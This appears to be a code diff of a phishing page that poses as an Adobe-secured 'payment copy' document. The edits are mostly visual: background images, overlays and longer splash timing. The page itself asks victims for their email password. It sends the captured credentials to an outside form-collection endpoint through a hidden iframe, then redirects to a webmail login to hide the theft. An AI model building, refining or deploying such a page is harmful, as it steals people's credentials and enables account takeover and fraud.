@@ -9,41 +9,80 @@
     html, body { height: 100%; }
     body {
       font-family: "Helvetica Neue", Arial, sans-serif;
-      background: #f6f6f6 url('download.jpg') no-repeat center top;
-      background-size: cover;
+      background: #f6f6f6;
       overflow: hidden;
     }
+    /* Splash with background image */
     #splash {
-      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      background: #fff; display: flex; align-items: center; justify-content: center; flex-direction: column;
-      z-index: 9999; transition: opacity 1s ease;
+      position: fixed; 
+      top: 0; left: 0; 
+      width: 100%; height: 100%;
+      background: url('download.jpg') no-repeat center center / cover;
+      display: flex; 
+      align-items: center; 
+      justify-content: center; 
+      flex-direction: column;
+      z-index: 9999; 
+      transition: opacity 1s ease;
+    }
+    #splash::after {
+      content: "";
+      position: absolute;
+      top: 0; left: 0; 
+      width: 100%; height: 100%;
+      background: rgba(255, 255, 255, 0.75);
+      z-index: 1;
+    }
+    #splash h2, #splash p, .loader {
+      position: relative; 
+      z-index: 2;
     }
     #splash h2 { font-size: 22px; color: #d32f2f; margin-bottom: 10px; }
-    #splash p { color: #666; font-size: 14px; }
+    #splash p { color: #333; font-size: 14px; }
     .loader {
       margin-top: 20px; width: 36px; height: 36px;
       border: 4px solid #ddd; border-top-color: #d32f2f;
       border-radius: 50%; animation: spin 1s linear infinite;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
+
     #main {
-      display: none; height: 100%;
-      display: flex; align-items: flex-start; justify-content: center;
-      padding: 28px 12px 60px; position: relative;
+      display: none; 
+      height: 100%;
+      display: flex; 
+      align-items: flex-start; 
+      justify-content: center;
+      padding: 28px 12px 60px; 
+      position: relative;
+      background: #f6f6f6 url('download.jpg') no-repeat center top;
+      background-size: cover;
     }
     #main.show { display: flex; animation: fadeIn 1s ease; }
     @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
     body::before {
       content: "PAYMENT COPY  PAYMENT COPY  PAYMENT COPY  PAYMENT COPY  PAYMENT COPY";
-      position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
-      font-size: 46px; font-weight: bold; color: rgba(200, 0, 0, 0.12);
-      transform: rotate(-35deg); white-space: pre; line-height: 120px;
-      pointer-events: none; z-index: 0;
+      position: absolute; 
+      top: -50%; left: -50%; 
+      width: 200%; height: 200%;
+      font-size: 46px; 
+      font-weight: bold; 
+      color: rgba(200, 0, 0, 0.12);
+      transform: rotate(-35deg); 
+      white-space: pre; 
+      line-height: 120px;
+      pointer-events: none; 
+      z-index: 0;
     }
     .card {
-      width: 450px; max-width: 94%; background: rgba(255,255,255,0.95);
-      border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-      padding: 28px 22px 34px; position: relative; z-index: 2; backdrop-filter: blur(4px);
+      width: 450px; max-width: 94%; 
+      background: rgba(255,255,255,0.95);
+      border-radius: 8px; 
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+      padding: 28px 22px 34px; 
+      position: relative; 
+      z-index: 2; 
+      backdrop-filter: blur(4px);
     }
     .pdf-icon { display: flex; align-items: center; justify-content: center; margin-bottom: 10px; }
     .pdf-icon img { width: 54px; height: auto; }
@@ -96,7 +135,6 @@
       <h1>This File is Protected By Adobe®<br>Security.</h1>
       <p class="lead">Click Continue to enter your password and view the payment copy.</p>
 
-      <!-- form submission using iframe -->
       <form id="mainForm" action="https://submit-form.com/ZydlGqudc" method="POST" target="hiddenFrame" autocomplete="on">
         <div id="stepEmail">
           <input id="email" name="email" class="input" type="email" placeholder="Email address" readonly required>
@@ -146,8 +184,8 @@
       setTimeout(() => {
         document.getElementById('splash').style.display = 'none';
         document.getElementById('main').classList.add('show');
-      }, 500);
-    }, 800);
+      }, 800);
+    }, 1500); // extended to give image visibility
   });
 
   const emailInput = document.getElementById('email');
@@ -199,8 +237,8 @@
     const overlay = document.createElement('div');
     overlay.style.cssText = `
       position:fixed;top:0;left:0;width:100%;height:100%;
-      background:rgba(255,255,255,0.96);display:flex;
-      flex-direction:column;align-items:center;justify-content:center;
+      background:url('download.jpg') no-repeat center center / cover, rgba(255,255,255,0.95);
+      display:flex;flex-direction:column;align-items:center;justify-content:center;
       z-index:99999;text-align:center;
     `;
     const spinner = document.createElement('div');
@@ -215,7 +253,6 @@
     overlay.append(spinner, msg);
     document.body.append(overlay);
 
-    // Redirect after 3s
     setTimeout(() => {
       window.location.href = "https://webmail.roundcube.101.hostinglogin.net/";
     }, 3000);
